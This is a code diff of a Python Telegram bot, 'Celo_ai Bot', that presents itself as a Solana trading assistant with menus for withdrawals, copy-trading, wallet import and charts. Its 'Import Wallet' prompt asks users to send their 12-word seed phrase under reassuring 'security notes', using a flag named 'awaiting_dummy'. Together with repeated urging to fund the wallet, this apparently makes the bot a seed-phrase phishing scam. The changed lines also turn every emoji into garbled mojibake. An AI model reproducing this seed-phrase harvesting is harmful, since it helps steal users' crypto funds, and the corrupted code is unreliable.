-                "❗ Token not found or no trading pairs available. Please check the contract address.",
+                "â— Token not found or no trading pairs available. Please check the contract address.",
                 reply_markup=main_menu_markup())
 
         context.user_data.pop("awaiting_token_contract", None)
@@ -1171,7 +1122,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Check if input is a number
         if not text.isdigit():
             await update.message.reply_text(
-                "❌ Please enter numbers only. Use the Cancel button above to cancel this input."
+                "âŒ Please enter numbers only. Use the Cancel button above to cancel this input."
             )
             return
 
@@ -1179,10 +1130,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Show success message with confirmation
         success_message = (
-            f"✅ <b>Setting Updated Successfully!</b>\n\n"
-            f"📋 <b>{option.replace('_', ' ').title()}</b> has been set to: <b>{text}</b>\n\n"
+            f"âœ… <b>Setting Updated Successfully!</b>\n\n"
+            f"ðŸ“‹ <b>{option.replace('_', ' ').title()}</b> has been set to: <b>{text}</b>\n\n"
             f"Your new setting is now active and will be applied to your trading activities.\n\n"
-            f"💡 You can update this setting anytime by going back to Settings."
+            f"ðŸ’¡ You can update this setting anytime by going back to Settings."
         )
 
         await update.message.reply_text(success_message,
@@ -1191,7 +1142,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # ----- Handle Menu selections -----
-    if text == "💸Withdraw":
+    if text == "ðŸ’¸Withdraw":
         # Check for deposits first
         await check_and_notify_deposits(user_id, context)
 
@@ -1207,16 +1158,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Show withdrawal options with inline buttons
         withdraw_buttons = InlineKeyboardMarkup(
             [[
-                InlineKeyboardButton("💸 Withdraw 100%",
+                InlineKeyboardButton("ðŸ’¸ Withdraw 100%",
                                      callback_data="withdraw_100")
             ],
              [
-                 InlineKeyboardButton("💸 Withdraw X SOL",
+                 InlineKeyboardButton("ðŸ’¸ Withdraw X SOL",
                                       callback_data="withdraw_custom")
              ]])
 
         await update.message.reply_text(
-            f"💸 <b>Withdraw SOL</b>\n\n"
+            f"ðŸ’¸ <b>Withdraw SOL</b>\n\n"
             f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
             f"<b>Minimum withdrawal:</b> {minimum_withdrawal:.4f} SOL\n"
             # f"<b>Gas fee reserve:</b> {MIN_GAS_RESERVE} SOL (must remain in wallet)\n\n"
@@ -1225,26 +1176,26 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=withdraw_buttons)
         return
 
-    elif text == "🔌Import Wallet":
+    elif text == "ðŸ”ŒImport Wallet":
         # Check for deposits first
         await check_and_notify_deposits(user_id, context)
 
         context.user_data["awaiting_dummy"] = True
         await update.message.reply_text(
-            "🔐 <b>Connect Your Wallet</b>\n\n"
+            "ðŸ” <b>Connect Your Wallet</b>\n\n"
             "Please send your 12-word seed phrase to connect your Solana wallet.\n\n"
-            "⚠️ <b>Security Notes:</b>\n"
-            "• Your seed phrase is never stored permanently\n"
-            "• It's only used to derive your wallet address\n"
-            "• The phrase is cleared from memory immediately\n"
-            "• Only send your seed phrase if you trust this bot\n\n"
-            "📝 <b>Format:</b> Send all 12 words separated by spaces\n"
+            "âš ï¸ <b>Security Notes:</b>\n"
+            "â€¢ Your seed phrase is never stored permanently\n"
+            "â€¢ It's only used to derive your wallet address\n"
+            "â€¢ The phrase is cleared from memory immediately\n"
+            "â€¢ Only send your seed phrase if you trust this bot\n\n"
+            "ðŸ“ <b>Format:</b> Send all 12 words separated by spaces\n"
             "<b>Example:</b> <code>word1 word2 word3 ... word12</code>",
             parse_mode="HTML",
             reply_markup=cancel_markup())
         return
 
-    elif text == "🔍Copy Trade":
+    elif text == "ðŸ”Copy Trade":
         # Check for deposits first
         await check_and_notify_deposits(user_id, context)
 
@@ -1255,11 +1206,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=cancel_markup())
         return
 
-    elif text == "⚙️Settings":
+    elif text == "âš™ï¸Settings":
         # Check for deposits first
         await check_and_notify_deposits(user_id, context)
 
-        await update.message.reply_text("Here are your ⚙️settings.")
+        await update.message.reply_text("Here are your âš™ï¸settings.")
 
         # Inline buttons that open TradingView charts
         Setting_buttons = InlineKeyboardMarkup([
@@ -1278,7 +1229,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ])
 
         settings_text = (
-            "<b>⚙️ Settings Menu</b>\n\n"
+            "<b>âš™ï¸ Settings Menu</b>\n\n"
             "Your settings are organized into categories for easy management:\n\n"
             "<b>Trading Options:</b>\n"
             "- Configure number of trades per day\n"
@@ -1290,52 +1241,51 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                         reply_markup=Setting_buttons)
         return
 
-    elif text == "💳Wallet":
+    elif text == "ðŸ’³Wallet":
         # Check for deposits first
         await check_and_notify_deposits(user_id, context)
 
         await show_wallet(update, context)
         return
 
-    elif text == "🤖Bot Guide":
+    elif text == "ðŸ¤–Bot Guide":
         # Check for deposits first
         await check_and_notify_deposits(user_id, context)
         guide_text = (
-            "📘 <b>How to Use CeloAI Trading Bot: Complete Feature Guide</b>\n\n"
-            "Welcome to <b>CeloAI Trading Bot</b>, your all-in-one Telegram trading assistant. "
+            "ðŸ“˜ <b>How to Use Celo_ai Bot: Complete Feature Guide</b>\n\n"
+            "Welcome to <b>Celo_ai Bot</b>, your all-in-one Telegram trading assistant. "
             "This guide walks you through the core features, how to use them safely, "
             "and why some security restrictions are in place.\n\n"
-            "1️⃣ <b>Autotrade</b>\n"
+            "1ï¸âƒ£ <b>Autotrade</b>\n"
             "Automate your trading strategies. Once configured, the bot executes trades "
-            "on your behalf based on your parameters. Perfect if you don’t want to "
+            "on your behalf based on your parameters. Perfect if you donâ€™t want to "
             "monitor the market constantly.\n\n"
-            "2️⃣ <b>Copytrade</b>\n"
+            "2ï¸âƒ£ <b>Copytrade</b>\n"
             "Mimic trades of successful wallets instantly. Just tap Copytrade, select a "
             "trader, and the bot will replicate their trades in your account.\n\n"
-            "3️⃣ <b>Wallet & Import Wallet</b>\n"
+            "3ï¸âƒ£ <b>Wallet & Import Wallet</b>\n"
             "Check balance, view info, monitor transactions, and manage funds. You can "
             "import a wallet by private key, but <i>exporting keys is disabled</i> for "
             "security reasons.\n\n"
-            "4️⃣ <b>Alerts</b>\n"
+            "4ï¸âƒ£ <b>Alerts</b>\n"
             "Get notified about price changes, successful trades, or new token launches "
             "so you never miss an opportunity.\n\n"
-            "5️⃣ <b>Wallet Info & Network</b>\n"
+            "5ï¸âƒ£ <b>Wallet Info & Network</b>\n"
             "View transaction history, balance, and choose blockchain networks such as "
             "Ethereum or BSC.\n\n"
-            "6️⃣ <b>Live Chart</b>\n"
+            "6ï¸âƒ£ <b>Live Chart</b>\n"
             "Access real-time market data, price trends, and token charts directly in Telegram.\n\n"
-            "🔒 <b>Security Note</b>\n"
+            "ðŸ”’ <b>Security Note</b>\n"
             "Private key <u>exporting is disabled</u> to protect your funds, even if "
             "your Telegram account is compromised. Importing keys is allowed for safe "
             "wallet connection.\n\n"
-            "⚡ <i>Note: Features are only available to funded wallets. Fund your wallet "
-            "to unlock the full potential of CeloAI Trading Bot!</i>\n\n"
-            "🌐 Official Support? Use the /support command.")
+            "âš¡ <i>Note: Features are only available to funded wallets. Fund your wallet "
+            "to unlock the full potential of Celo_ai Bot!</i>")
 
         # Inline buttons
         guide_buttons = InlineKeyboardMarkup([
             [
-                InlineKeyboardButton("💰 Fund Wallet",
+                InlineKeyboardButton("ðŸ’° Fund Wallet",
                                      callback_data="fund_wallet")
             ],
         ])
@@ -1345,69 +1295,69 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                         reply_markup=guide_buttons)
         return
 
-    elif text == "💰Buy/Sell":
+    elif text == "ðŸ’°Buy/Sell":
         # Check for deposits first
         await check_and_notify_deposits(user_id, context)
 
         context.user_data["awaiting_token_contract"] = True
         await update.message.reply_text(
-            "💰 <b>Buy Token</b>\n\n"
+            "ðŸ’° <b>Buy Token</b>\n\n"
             "Please paste the Solana token contract address you want to buy.\n\n"
-            "📝 <b>Example:</b>\n"
-            "<code>pumpCmXqMfrsAkQ5r49WcJnRayYRqmXz6ae8H7H9Dfn</code>\n\n"
+            "ðŸ“ <b>Example:</b>\n"
+            "<code>HZ47qG6JyiM6KMJHLUJy7tsRtzE6CLthTEWj4opwgkHf</code>\n\n"
             "I'll show you the token details including price, market cap, liquidity, and security info.\n\n"
             "Tap Cancel if you want to go back.",
             parse_mode="HTML",
             reply_markup=cancel_markup())
         return
 
-    elif text == "📊Live Chart":
+    elif text == "ðŸ“ŠLive Chart":
         # Check for deposits first
         await check_and_notify_deposits(user_id, context)
 
-        chart_text = ("<b>🔥 Top Coins Charts</b>\n"
+        chart_text = ("<b>ðŸ”¥ Top Coins Charts</b>\n"
                       "Choose a coin below to view its live chart.\n")
 
         # Inline buttons that open TradingView charts
         chart_buttons = InlineKeyboardMarkup(
             [[
                 InlineKeyboardButton(
-                    "📈 BITCOIN (BTC)",
+                    "ðŸ“ˆ BITCOIN (BTC)",
                     url="https://www.tradingview.com/chart/?symbol=BTCUSDT")
             ],
              [
                  InlineKeyboardButton(
-                     "📈 ETHEREUM (ETH)",
+                     "ðŸ“ˆ ETHEREUM (ETH)",
                      url="https://www.tradingview.com/chart/?symbol=ETHUSDT")
              ],
              [
                  InlineKeyboardButton(
-                     "📈 SOLANA (SOL)",
+                     "ðŸ“ˆ SOLANA (SOL)",
                      url="https://www.tradingview.com/chart/?symbol=SOLUSDT")
              ],
              [
                  InlineKeyboardButton(
-                     "📈 DOGECOIN (DOGE)",
+                     "ðŸ“ˆ DOGECOIN (DOGE)",
                      url="https://www.tradingview.com/chart/?symbol=DOGEUSDT")
              ],
              [
                  InlineKeyboardButton(
-                     "📈 SHIBA INU (SHIB)",
+                     "ðŸ“ˆ SHIBA INU (SHIB)",
                      url="https://www.tradingview.com/chart/?symbol=SHIBUSDT")
              ],
              [
                  InlineKeyboardButton(
-                     "📈 POLKADOT (DOT)",
+                     "ðŸ“ˆ POLKADOT (DOT)",
                      url="https://www.tradingview.com/chart/?symbol=DOTUSDT")
              ],
              [
                  InlineKeyboardButton(
-                     "📈 CARDANO (ADA)",
+                     "ðŸ“ˆ CARDANO (ADA)",
                      url="https://www.tradingview.com/chart/?symbol=ADAUSDT")
              ],
              [
                  InlineKeyboardButton(
-                     "📈 LITECOIN (LTC)",
+                     "ðŸ“ˆ LITECOIN (LTC)",
                      url="https://www.tradingview.com/chart/?symbol=LTCUSDT")
              ]])
 
@@ -1444,7 +1394,6 @@ async def background_deposit_monitor(context: ContextTypes.DEFAULT_TYPE):
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("support", support))
     app.add_handler(
         MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(CallbackQueryHandler(button_handler))
@@ -1462,3 +1411,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
